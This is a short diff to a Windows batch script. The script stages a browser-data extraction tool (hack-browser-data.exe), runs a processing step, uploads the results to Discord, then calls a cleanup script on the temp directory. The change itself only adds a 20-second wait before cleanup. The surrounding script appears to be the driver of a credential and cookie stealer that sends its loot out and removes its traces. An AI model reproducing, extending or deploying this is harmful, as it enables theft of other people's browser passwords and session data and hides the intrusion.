@@ -41,12 +41,12 @@ for %%F in (process.bat hack-browser-data.exe upload_discord.bat cleanup.bat) do
 
 REM Create running flag
 echo %datetime% > "%tempdir%\running.tmp"
-
 echo Starting process----------------------------------------
 call "%tempdir%\process.bat"
-
 echo uploading to discord----------------------------------------
 call "%tempdir%\upload_discord.bat"
-
+echo Waiting 20 seconds before cleanup...
+echo Temp directory to be cleaned: %tempdir%
+timeout /t 20 /nobreak >nul
 echo Process finished, starting cleanup----------------------------------------
 call "%tempdir%\cleanup.bat" "%tempdir%"
